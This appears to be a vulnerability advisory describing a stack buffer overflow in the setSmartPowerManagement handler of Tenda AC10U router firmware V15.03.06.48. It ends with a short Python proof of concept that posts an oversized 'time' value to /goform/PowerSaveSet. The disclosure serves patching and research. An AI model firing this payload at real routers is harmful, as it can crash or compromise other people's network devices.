## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `setSmartPowerManagement` function. The `time` variable receives the `time` parameter from a POST request and `time` is directly parsed into the `hour_start`, `min_start`, `hour_end` and `min_end`. However, since the user can control the input of `time`, the statement `sprintf(starttime, "%s:%s", hour_start, min_start); sprintf(endstart, "%s:%s", hour_end, min_end);` can cause a buffer overflow by  `hour_start`, `min_start`, `hour_end` and `min_end`.

![image-20240313213135344](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313213135344.png)

![image-20240313213152425](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313213152425.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/PowerSaveSet"
payload = 'a'*1000 + ':aaaa-bbb:1'

data = {"time": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313213754468](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313213754468.png)
